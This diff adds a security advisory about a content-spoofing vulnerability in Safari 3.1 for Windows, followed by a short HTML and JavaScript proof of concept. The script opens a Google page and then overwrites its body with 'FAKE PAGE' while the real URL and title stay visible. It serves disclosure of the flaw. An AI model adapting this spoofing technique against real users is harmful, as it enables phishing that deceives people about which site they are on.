@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28405/info
+
+Apple Safari is prone to a content-spoofing vulnerability that allows attackers to populate a vulnerable Safari browser window with arbitrary malicious content. During such an attack, the URL and window title will display the intended site, while the body of the webpage is spoofed.
+
+Safari 3.1 running on Microsoft Windows is reported vulnerable.
+
+NOTE: This issue may be related to the vulnerability discussed in BID 24457 (Apple Safari for Windows Window.setTimeout Content Spoofing Vulnerability). 
+
+<html> Safari browser 3.1 (525.13) spoofing by Juan Pablo Lopez Yacubian <html> <head> <title>Recipe 6.6</title> <script type="text/javascript"> var newWindow; function makeNewWindow() { if (!newWindow || newWindow.closed) { newWindow = window.open('http://www.google.com.ar/','_self'); setTimeout("writeToWindow()", 50); } else if (newWindow.focus) { newWindow.focus(); } } function writeToWindow() { var newContent = "<html><head><title>Google</title></head>"; newContent += "<body> <h1>FAKE PAGE</h1>"; newWindow.document.write(newContent); newWindow.document.close(); } </script> </head> <body> <form> <input type="button" value="test spoof!" onclick="makeNewWindow();"/> </form> </body> </html> 
